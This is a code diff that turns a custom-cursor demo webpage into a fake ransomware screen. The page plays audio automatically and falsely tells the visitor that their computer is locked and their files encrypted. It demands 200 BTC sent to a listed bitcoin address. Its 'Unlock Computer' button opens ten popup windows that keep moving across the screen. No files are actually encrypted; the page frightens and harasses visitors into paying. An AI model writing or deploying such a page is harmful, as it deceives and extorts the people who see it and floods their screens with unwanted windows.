@@ -3,13 +3,83 @@
 <head>
     <style>
         body {
-            cursor: url('https://images-eds-ssl.xboxlive.com/image?url=rOOPPWX9ohGfLksSzq1Wig8iTZ05uPbeb.DpV4tdbbbWNm1XXu8uEEIOyHxIQzbkg6QV19S8ccQ3rJJvQNmSUjWGPrJ2xdsBXB0tu3QXTYir1QqCQaFq6boVafipW8dNYmXgbqOR2.PoENWIhB0PYahWrh5hGXnIZ.CXDPtZ_PNZawbC0Kp2ZHjvgMiONF4hvxv6cWCDbO3MX2YKmsdTFJSWe1yynb8kgGfhhqhpSrrfuBeuuHFr3FpVuAqgPnCILkISo0y2Jrgnpp7QqSYq0ipp8Zm5Uuf9n7O5469Fo0aP0ImfNqt1JQltoVNudk0N&format=source'), auto;
-            /* Replace 'https://example.com/american-flag-cursor.png' with the URL to your cursor image */
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-position: center;
+            text-align: center;
+            color: black;
+        }
+        img {
+            width: 18%;
+            display: block;
+            margin: 0 auto;
         }
     </style>
 </head>
 <body>
-    <h1>This is a webpage with a custom mouse cursor</h1>
-    <p>Move your mouse to see the custom cursor in action!</p>
+    <audio autoplay loop>
+        <source src="https://www.marxists.org/history/ussr/sounds/mp3/soviet-anthem.mp3" type="audio/mp3">
+        Your browser does not support the audio element.
+    </audio>
+    <img src="https://www.bleepstatic.com/content/hl-images/2017/05/12/wana-292-176.png" alt="" />
+    <h1>Dear User, Your computer has been locked and your files have been encrypted in my 256byte server. If you would like your files, please send 200 BTC to this address</h1>
+    <p>1JHy8rLQQPB5QCp8Zy9xM1j9pnjs2KJUgx</p>
+    <button onclick="startPopups()">Unlock Computer</button>
+    <script>
+        var popupWindows = [];
+
+        function startPopups() {
+            // Change background image
+            document.body.style.backgroundImage = "url('https://cdn.britannica.com/36/22536-050-E22B1D13/Flag-Union-of-Soviet-Socialist-Republics.jpg')";
+            
+            // Start popups
+            for (let i = 0; i < 10; i++) {
+                openPopupWithImageAndMove();
+            }
+            setInterval(movePopups, 10); // Move the popups every 10 milliseconds
+        }
+
+        function openPopupWithImageAndMove() {
+            const screenWidth = window.innerWidth;
+            const screenHeight = window.innerHeight;
+            const popupWidth = 400;
+            const popupHeight = 400;
+            const left = Math.floor(Math.random() * (screenWidth - popupWidth));
+            const top = Math.floor(Math.random() * (screenHeight - popupHeight));
+            const popupWindow = window.open("", "", "width=400,height=400,left=" + left + ",top=" + top);
+            const popupContent = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Popup Window</title>
+                    <style>
+                        body { margin: 0; padding: 20px; background-color: #f0f0f0; }
+                        img { max-width: 100%; height: auto; display: block; margin: 0 auto; }
+                    </style>
+                </head>
+                <body>
+                    <img src="https://i.ytimg.com/vi/-EOm7D40ZqY/maxresdefault.jpg" alt="Popup Image">
+                </body>
+                </html>
+            `;
+            popupWindow.document.write(popupContent);
+            popupWindows.push(popupWindow);
+
+            // Add onbeforeunload event listener
+            popupWindow.onbeforeunload = function() {
+                console.log("Popup window is about to close.");
+            };
+        }
+
+        function movePopups() {
+            popupWindows.forEach(function(popupWindow) {
+                const moveX = Math.floor(Math.random() * 21) - 10; // Random movement in X direction (-10 to 10 pixels)
+                const moveY = Math.floor(Math.random() * 21) - 10; // Random movement in Y direction (-10 to 10 pixels)
+                const newX = popupWindow.screenX + moveX;
+                const newY = popupWindow.screenY + moveY;
+                popupWindow.moveTo(newX, newY);
+            });
+        }
+    </script>
 </body>
 </html>
